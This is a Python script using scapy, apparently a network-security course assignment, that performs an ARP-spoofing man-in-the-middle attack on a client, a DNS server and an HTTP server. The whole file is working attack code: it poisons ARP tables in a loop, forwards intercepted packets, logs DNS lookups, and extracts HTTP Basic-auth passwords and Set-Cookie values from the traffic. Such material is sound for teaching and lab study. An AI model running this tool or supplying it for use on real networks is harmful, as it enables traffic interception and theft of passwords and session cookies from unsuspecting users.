#!/usr/bin/env python3
from scapy.all import *

import argparse
import sys
import threading
import time
import base64

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    arp_request = ARP(op=1, pdst=IP, hwdst='ff:ff:ff:ff:ff:ff')
    resp = sr1(arp_request)
    return resp[ARP].hwsrc


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # TODO: Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # TODO: Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    gratuitous_arp = ARP(op=2, psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC)
    send(gratuitous_arp)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    spoof(srcIP, srcMAC, dstIP, dstMAC)


def handle_packet(p):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    try:
        if p[Ether].src == attackerMAC: # Ignore our own spoofing packets
            return;
        debug(f'Sniffed: {p.summary()}')
        p[Ether].src=attackerMAC
        if p[IP].dst == httpServerIP: p[Ether].dst = httpServerMAC
        if p[IP].dst == dnsServerIP: p[Ether].dst = dnsServerMAC
        if p[IP].dst == clientIP: p[Ether].dst = clientMAC
        if DNS in p:
            if p[DNS].an is None:
                print(f'*hostname:{p[DNS].qd.qname.decode("utf-8")}')
            else:
                print(f'*hostaddr:{p[DNS].an.rdata}')
        elif TCP in p:
            if p[IP].dst == httpServerIP and Raw in p:
                auth = find_auth_password(p[Raw].load)
                if auth is not None:
                    print(f'*basicauth:{auth}')
            elif p[IP].src == httpServerIP and Raw in p:
                cookie = find_cookie(p[Raw].load)
                if cookie is not None:
                    print(f'*cookie:{cookie}')
        sendp(p, iface=conf.iface)
    except Exception as e:
        debug(f'Error when sniffing: {e}')


def find_cookie(payload):
    payload = payload.decode('utf-8')
    payload = payload.split('\r\n')
    cookie = None
    for s in payload:
        if s.find('Set-Cookie:') != -1:
            cookie = s.split(':')[1].strip()
            break
    return cookie


def find_auth_password(payload):
    payload = payload.decode('utf-8')
    payload = payload.split('\r\n')
    auth = None
    for s in payload:
        if s.find('Authorization:') != -1:
            auth = s
            break
    if auth is not None:
        auth = auth.split(' ')[2]
        auth = base64.b64decode(auth)
        auth = auth.decode('utf-8')
        auth = auth.split(':')[1]
    return auth


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    bpf = (f"(dst host {clientIP}) or ((src host {clientIP} and ((dst host {dnsServerIP}) or (dst host {httpServerIP}))))")
    debug(f'Sniffer use BPF: {bpf}')
    sniff(store=0, filter=bpf, prn=handle_packet,
            stop_filter=lambda x: False, iface=conf.iface)


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
